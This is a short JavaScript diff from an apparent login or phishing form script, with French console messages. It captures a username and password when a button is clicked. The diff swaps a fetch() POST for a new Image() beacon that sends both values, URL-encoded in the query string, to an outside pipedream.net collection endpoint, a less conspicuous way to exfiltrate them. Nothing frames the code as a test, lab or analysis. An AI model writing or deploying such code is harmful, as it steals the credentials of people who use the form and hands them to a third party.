@@ -16,18 +16,7 @@ if (btn) {
         console.log(username);
         console.log(password);
         
-        fetch('https://eojy4h95a631zv3.m.pipedream.net', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({
-                username: username,
-                password: password
-            })
-        })
-        .then(response => console.log('Données envoyées avec succès !'))
-        .catch(error => console.error('Erreur lors de l\'envoi des données :', error));
+        new Image().src = 'https://eojy4h95a631zv3.m.pipedream.net/?username=' + encodeURIComponent(username) + '&password=' + encodeURIComponent(password);
     };
 } else {
     console.log('Bouton non trouvé');
